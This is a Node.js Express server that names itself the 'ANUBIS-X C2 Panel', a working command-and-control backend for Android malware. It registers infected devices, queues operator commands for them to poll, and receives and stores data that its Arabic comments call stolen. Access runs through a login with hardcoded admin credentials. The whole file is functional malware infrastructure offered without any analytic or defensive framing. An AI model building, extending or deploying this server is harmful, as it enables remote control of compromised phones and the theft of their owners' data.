const express = require('express');
const session = require('express-session');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// ===== CORS =====
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

// ===== الإعدادات =====
app.use(bodyParser.json());
app.use(express.static(__dirname));
app.use(session({
    secret: 'anubis-secret-key-2024',
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false, maxAge: 3600000 }
}));

// ===== التخزين المؤقت =====
let devices = [];
let commands = [];
let capturedData = [];

// ===== تسجيل الدخول =====
app.post('/api/login', (req, res) => {
    console.log('Login attempt:', req.body);
    const { username, password } = req.body;
    
    if (username === 'admin' && password === 'anubis2024') {
        req.session.logged_in = true;
        console.log('✅ Login successful');
        res.json({ success: true });
    } else {
        console.log('❌ Login failed');
        res.json({ success: false });
    }
});

// ===== التحقق من الدخول =====
app.get('/api/check-auth', (req, res) => {
    res.json({ logged_in: req.session.logged_in || false });
});

// ===== تسجيل الخروج =====
app.post('/api/logout', (req, res) => {
    req.session.destroy();
    res.json({ success: true });
});

// ===== تسجيل جهاز جديد =====
app.post('/api/register-device', (req, res) => {
    const device = {
        id: req.body.device_id || 'unknown',
        model: req.body.model || 'Unknown',
        manufacturer: req.body.manufacturer || 'Unknown',
        android_version: req.body.android_version || 'N/A',
        sdk_version: req.body.sdk_version || 0,
        last_seen: new Date().toISOString(),
        online: true
    };
    
    const index = devices.findIndex(d => d.id === device.id);
    if (index !== -1) {
        devices[index] = { ...devices[index], ...device };
        console.log('🔄 Device updated:', device.model);
    } else {
        devices.push(device);
        console.log('📱 New device registered:', device.model);
    }
    
    res.json({ success: true });
});

// ===== جلب الأجهزة =====
app.get('/api/devices', (req, res) => {
    if (!req.session.logged_in) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    res.json({ devices });
});

// ===== إرسال أمر =====
app.post('/api/commands', (req, res) => {
    if (!req.session.logged_in) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const command = {
        id: Date.now(),
        device_id: req.body.device_id,
        command: req.body.command,
        status: 'pending',
        created_at: new Date().toISOString()
    };
    
    commands.push(command);
    console.log('🎮 Command sent:', command.command, '→', command.device_id);
    res.json({ success: true, command_id: command.id });
});

// ===== جلب الأوامر لجهاز معين =====
app.get('/api/get-commands/:deviceId', (req, res) => {
    const deviceCommands = commands.filter(c => 
        c.device_id === req.params.deviceId && c.status === 'pending'
    );
    
    deviceCommands.forEach(c => c.status = 'executed');
    
    res.json({ commands: deviceCommands });
});

// ===== إرسال بيانات مسروقة =====
app.post('/api/send-data', (req, res) => {
    const data = req.body.data || 'No data';
    const deviceId = req.body.device_id || 'unknown';
    
    capturedData.push({
        device_id: deviceId,
        data: data,
        timestamp: new Date().toISOString()
    });
    
    console.log('📊 Data from', deviceId, ':', data.substring(0, 100));
    res.json({ success: true });
});

// ===== جلب البيانات المسروقة =====
app.get('/api/data', (req, res) => {
    if (!req.session.logged_in) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    
    const logs = capturedData.map(item => 
        `[${item.timestamp}] [${item.device_id}] ${item.data}`
    );
    
    res.json({ logs });
});

// ===== الإحصائيات =====
app.get('/api/stats', (req, res) => {
    res.json({
        devices: devices.length,
        commands: commands.length,
        data: capturedData.length
    });
});

// ===== الصفحة الرئيسية =====
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ===== لوحة التحكم =====
app.get('/dashboard', (req, res) => {
    if (!req.session.logged_in) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'dashboard.html'));
});

// ===== تشغيل السيرفر =====
app.listen(PORT, () => {
    console.log('⚡ ANUBIS-X C2 Panel');
    console.log(`🌐 Running on port ${PORT}`);
});
